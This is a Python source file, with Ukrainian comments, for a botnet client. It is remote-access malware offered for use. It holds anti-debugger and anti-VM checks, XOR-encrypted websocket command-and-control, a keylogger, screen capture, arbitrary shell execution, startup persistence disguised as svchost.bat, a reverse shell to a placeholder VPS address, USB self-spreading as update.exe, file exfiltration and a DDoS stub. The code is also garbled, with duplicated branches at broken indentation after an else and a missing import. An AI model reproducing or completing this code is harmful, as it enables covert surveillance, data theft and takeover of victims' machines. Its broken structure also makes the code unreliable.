import asyncio
import websockets
import sys
import subprocess
import os
import time
import random
from PIL import ImageGrab
import base64
import io
import requests
import shutil
from pynput import keyboard
import threading
import ctypes
import platform

# XOR Encryption (той самий ключ)
KEY = b"AMY_BOTNET_2026_SECRET_KEY_1337"

def xor_encrypt(data: bytes) -> bytes:
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])

def xor_decrypt(data: bytes) -> bytes:
    return xor_encrypt(data)

def encrypt_message(msg: str) -> str:
    return base64.b64encode(xor_encrypt(msg.encode('utf-8'))).decode('utf-8')

def decrypt_message(encoded: str) -> str:
    return xor_decrypt(base64.b64decode(encoded)).decode('utf-8', errors='ignore')

# Anti-Detection
def anti_analysis():
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            os._exit(0)
        output = subprocess.getoutput("systeminfo").lower()
        if any(x in output for x in ["vmware", "virtualbox", "qemu", "xen", "kvm"]):
            os._exit(0)
    except:
        pass

anti_analysis()

keylog_buffer = ""

def on_press(key):
    global keylog_buffer
    try:
        keylog_buffer += str(key.char)
    except:
        keylog_buffer += f" [{key}] "

async def bot_client(bot_id: str):
    C2_SERVERS = ["ws://127.0.0.1:8000"]  # додай свої

    while True:
        try:
            server = random.choice(C2_SERVERS)
            async with websockets.connect(server) as ws:
                print(f"[+] Bot {bot_id} connected")

                threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).join(), daemon=True).start()

                while True:
                    await asyncio.sleep(random.uniform(0.6, 2.8))

                    encrypted_cmd = await ws.recv()
                    command = decrypt_message(encrypted_cmd)

                    if command.startswith("shell:"):
                        result = subprocess.getoutput(command[6:])
                        await ws.send(encrypt_message(result))

                    elif command == "screenshot":
                        screenshot = ImageGrab.grab()
                        buffer = io.BytesIO()
                        screenshot.save(buffer, format="PNG")
                        await ws.send(encrypt_message(f"SCREENSHOT:{base64.b64encode(buffer.getvalue()).decode()}"))

                    elif command == "start_keylogger":
                        global keylog_buffer
                        if keylog_buffer:
                            await ws.send(encrypt_message(f"KEYLOG:{keylog_buffer}"))
                            keylog_buffer = ""

                    elif command == "add_persistence":
                        # Windows persistence
                        try:
                            path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svchost.bat")
                            with open(path, "w") as f:
                                f.write(f'@echo off\npython "{os.path.abspath(sys.argv[0])}" {bot_id}\n')
                            await ws.send(encrypt_message("Persistence added"))
                        except:
                            await ws.send(encrypt_message("Persistence failed"))

                    elif command == "start_reverse_shell":
                        # Простий reverse shell
                        try:
                            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            s.connect(("твій_VPS_IP", 4444))  # заміни на свій IP + порт
                            while True:
                                cmd = s.recv(1024).decode()
                                if cmd.lower() == "exit":
                                    break
                                output = subprocess.getoutput(cmd)
                                s.send(output.encode())
                        except:
                            pass

                    elif command == "start_spreading":
                        # Простий spreading через USB
                        try:
                            for drive in "DEFGHIJKLMNOPQRSTUVWXYZ":
                                path = f"{drive}:\\"
                                if os.path.exists(path):
                                    shutil.copy(sys.argv[0], path + "update.exe")
                        except:
                            pass
                        await ws.send(encrypt_message("Spreading attempted"))

                    elif command == "list_files":
                        files = os.listdir(".")
                        await ws.send(encrypt_message(f"FILES:{','.join(files)}"))

                    elif command.startswith("ddos:"):
                        # DDoS код з попередніх повідомлень (UDP, SYN, Slowloris)
                        pass  # встав сюди попередній DDoS код

                    else:
                        await ws.send(encrypt_message("OK"))

                                        elif command == "list_files":
                        files = [f for f in os.listdir(".") if os.path.isfile(f)]
                        await ws.send(encrypt_message(f"FILELIST:{','.join(files)}"))

                    elif command.startswith("upload:"):
                        _, filename, encoded = command.split(":", 2)
                        content = base64.b64decode(encoded)
                        with open(filename, "wb") as f:
                            f.write(content)
                        await ws.send(encrypt_message(f"File {filename} uploaded successfully"))

                                        elif command.startswith("download_file:"):
                        filename = command.split(":", 1)[1]
                        try:
                            with open(filename, "rb") as f:
                                content = f.read()
                            encoded = base64.b64encode(content).decode()
                            await ws.send(encrypt_message(f"FILE:{filename}:{encoded}"))
                        except:
                            await ws.send(encrypt_message("File not found"))

                    elif command == "start_reverse_shell":
                        # Простий reverse shell (підключається до твого listener на порту 4444)
                        try:
                            import socket
                            s = socket.socket()
                            s.connect(("ТВІЙ_VPS_IP", 4444))  # ← ЗАМІНИ НА СВІЙ IP
                            while True:
                                cmd = s.recv(4096).decode()
                                if not cmd:
                                    break
                                output = subprocess.getoutput(cmd)
                                s.send(output.encode() + b"\n")
                        except:
                            pass

                                        elif command.startswith("shell:"):
                        result = subprocess.getoutput(command[6:])
                        await ws.send(encrypt_message(result))

        except Exception:
            await asyncio.sleep(random.uniform(8, 25))

if __name__ == "__main__":
    bot_id = sys.argv[1] if len(sys.argv) > 1 else f"bot-{os.urandom(4).hex()}"
    asyncio.run(bot_client(bot_id))
